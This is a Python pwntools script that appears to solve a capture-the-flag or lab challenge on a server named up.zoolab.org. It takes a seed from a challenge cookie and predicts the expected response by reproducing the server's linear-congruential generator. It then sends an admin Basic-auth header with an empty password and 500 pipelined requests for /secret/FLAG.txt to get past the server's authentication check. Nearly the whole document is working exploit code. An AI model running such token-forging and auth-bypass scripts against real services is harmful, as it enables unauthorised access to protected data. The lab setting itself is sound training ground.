from pwn import *
import base64

HOST = 'up.zoolab.org'
PORT = 10933

# Step 1: 先拿 Set-Cookie
r = remote(HOST, PORT)
r.send(b"GET /secret/FLAG.txt HTTP/1.1\r\n\r\n")

reqseed = None
while True:
    line = r.recvline()
    print(line)
    if b'Set-Cookie' in line:
        cookie_line = line.decode()
        reqseed = int(cookie_line.split('challenge=')[1].split(';')[0])
        print(f"[+] Got reqseed: {reqseed}")
        break

if reqseed is None:
    print("[-] Failed to get reqseed")
    exit()

x2 = (reqseed * 6364136223846793005 + 1) & 0xFFFFFFFFFFFFFFFF
x2 = x2 >> 33
cookie = f"Cookie: response={x2}"
print(f"[+] Computed cookie: {x2}")
b64 = base64.b64encode(b"admin:").decode()
auth = f"Authorization: Basic {b64}"  # admin:password

# 準備 payload
payload = ""
for _ in range(500):
    # Request : 嘗試讀取 secret
    payload = (
        "GET /secret/FLAG.txt HTTP/1.1\r\n"
        + f"Host: {HOST}\r\n" 
        + auth + "\r\n"
        + cookie + "\r\n"
        + "\r\n"
    )
    r.send(payload.encode())
    payload = (
        "GET /index.html HTTP/1.1\r\n"
        + f"Host: {HOST}\r\n" 
        + auth + "\r\n"
        + cookie + "\r\n"
        + "\r\n"
    )
    r.send(payload.encode())

# 讀 response
while True:
    try:
        line = r.recvline(timeout=1)
        print(line)
        if b"FLAG" in line or b"flag" in line:
            print("🎉 Found flag!")
            break
    except:
        break

r.close()
